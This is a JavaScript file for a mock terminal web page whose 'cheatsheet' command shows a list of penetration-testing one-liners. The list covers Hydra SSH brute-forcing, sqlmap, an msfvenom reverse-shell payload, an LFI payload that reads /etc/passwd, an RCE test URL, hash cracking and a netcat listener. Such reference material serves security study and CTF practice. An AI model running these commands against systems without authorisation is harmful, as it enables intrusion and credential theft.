const BLACKLISTED_KEY_CODES = [38];
const COMMANDS = {
commands:
'command1, command2, command3, command4, command5, command6, command7',
cheatsheet:
    `<p><b><u>nmap_quick:</u></b> Run a quick Nmap scan to discover open ports and services: 'nmap -sC -sV -oA output target_ip'</p>
<p><b><u>dirb_default:</u></b> Run Dirb with default settings to find hidden directories and files on a web server: 'dirb http://target_ip/'</p>
<p><b><u>gobuster_dir:</u></b> Use GoBuster for directory brute-forcing: 'gobuster dir -u http://target_ip/ -w /path/to/wordlist'</p>
<p><b><u>nikto_scan:</u></b> Perform a quick Nikto scan to identify web server vulnerabilities: 'nikto -h http://target_ip/'</p>
<p><b><u>hydra_ssh:</u></b> Use Hydra to brute-force SSH login: 'hydra -l username -P /path/to/password_list ssh://target_ip'</p>
<p><b><u>sqlmap_basic:</u></b> Run SQLMap to test for SQL injection vulnerabilities: 'sqlmap -u "http://target_ip/vulnerable_page.php?id=1"'</p>
<p><b><u>wfuzz_params:</u></b> Use Wfuzz to fuzz GET parameters for possible injection points: 'wfuzz -c -z file,/path/to/wordlist -u "http://target_ip/?FUZZ=test"'</p>
<p><b><u>msfvenom_payload:</u></b> Generate a reverse shell payload using Msfvenom: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f exe > payload.exe'</p>
<p><b><u>searchsploit:</u></b> Search for exploits in the Exploit Database using Searchsploit: 'searchsploit service_name version'</p>
<p><b><u>priv_esc:</u></b> When looking for privilege escalation opportunities on Linux, use 'linpeas.sh' or 'linenum.sh' scripts, and on Windows, use 'winPEAS.exe' or 'PowerUp.ps1'</p>
<p><b><u>reverse_shell_cheatsheet:</u></b> View a list of reverse shell one-liners in various languages (e.g., Bash, Python, PHP, etc.): 'https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'</p>
<p><b><u>tcpdump_capture:</u></b> Capture network traffic using tcpdump: 'tcpdump -i eth0 -w output.pcap'</p>
<p><b><u>wireshark_filter:</u></b> Apply a Wireshark filter to only display HTTP traffic: 'http.request or http.response'</p>
<p><b><u>strings_analysis:</u></b> Analyze a binary file for readable strings: 'strings /path/to/binary'</p>
<p><b><u>volatility_mem_analysis:</u></b> Analyze a memory dump using Volatility: 'volatility -f memory.dmp --profile=Win7SP1x64 pslist'</p>
<p><b><u>steghide_extract:</u></b> Extract hidden data from an image using steghide: 'steghide extract -sf /path/to/image.jpg'</p>
<p><b><u>stegsolve_tool:</u></b> Use Stegsolve to analyze images for hidden information: 'https://github.com/zardus/ctf-tools/blob/master/stegsolve/install'</p>
<p><b><u>hex_editor:</u></b> Use a hex editor like xxd to analyze binary files: 'xxd /path/to/binary'</p>
<p><b><u>john_the_ripper:</u></b> Crack password hashes using John the Ripper: 'john --wordlist=/path/to/wordlist /path/to/hashfile</p>
<p><b><u>enum4linux_scan:</u></b> Enumerate SMB shares and users on a target using Enum4linux: 'enum4linux -a target_ip</p>
<p><b><u>hashcat_crack:</u></b> Crack password hashes using Hashcat: 'hashcat -m hash_mode -a attack_mode -o output.txt /path/to/hashfile /path/to/wordlist</p>
<p><b><u>lfi_exploit:</u></b> Exploit Local File Inclusion (LFI) vulnerabilities using a PHP wrapper: 'http://target_ip/vulnerable_page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</p>
<p><b><u>rce_test:</u></b> Test for Remote Command Execution (RCE) vulnerabilities by executing a simple command, such as 'id: 'http://target_ip/vulnerable_page.php?cmd=id</p>
<p><b><u>burp_proxy:</u></b> Use Burp Suite as a proxy to intercept and modify HTTP requests and responses for in-depth analysis</p>
<p><b><u>tmux_session:</u></b> Create and manage multiple terminal sessions using Tmux: 'tmux new-session -s session_name</p>
<p><b><u>python_http_server:</u></b> Start a simple HTTP server using Python: 'python -m SimpleHTTPServer 80' (Python 2) or 'python -m http.server 80' (Python 3)</p>
<p><b><u>ssh_tunnel:</u></b> Create an SSH tunnel to access remote services securely: 'ssh -L local_port:remote_ip:remote_port user@target_ip</p>
<p><b><u>crontab_view:</u></b> View the list of scheduled tasks (cron jobs) on a Linux system: 'crontab -l</p>
<p><b><u>netcat_listen:</u></b> Set up a Netcat listener for incoming connections: 'nc -lvnp listening_port'</p>`,
};
let userInput, terminalOutput;

const app = () => {
  userInput = document.getElementById("userInput");
  terminalOutput = document.getElementById("terminalOutput");
  document.getElementById("dummyKeyboard").focus();
  console.log("Application loaded");
};

const execute = function executeCommand(input) {
  let output;
  input = input.toLowerCase();
  if (input.length === 0) {
    return;
  }
  output = `<div class="terminal-line"><span class="success">➜</span> <span class="directory">~</span> ${input}</div>`;
  if (!COMMANDS.hasOwnProperty(input)) {
    output += `<div class="terminal-line">no such command: ${input}</div>`;
    console.log("Oops! no such command");
  } else {
    output += COMMANDS[input];
  }

  terminalOutput.innerHTML = `${
    terminalOutput.innerHTML
  }<div class="terminal-line">${output}</div>`;
  terminalOutput.scrollTop = terminalOutput.scrollHeight;
};

const key = function keyEvent(e) {
  const input = userInput.innerHTML;

  if (BLACKLISTED_KEY_CODES.includes(e.keyCode)) {
    return;
  }

  if (e.key === "Enter") {
    execute(input);
    userInput.innerHTML = "";
    return;
  }

  userInput.innerHTML = input + e.key;
};

const backspace = function backSpaceKeyEvent(e) {
  if (e.keyCode !== 8 && e.keyCode !== 46) {
    return;
  }
  userInput.innerHTML = userInput.innerHTML.slice(
    0,
    userInput.innerHTML.length - 1
  );
};

document.addEventListener("keydown", backspace);
document.addEventListener("keypress", key);
document.addEventListener("DOMContentLoaded", app);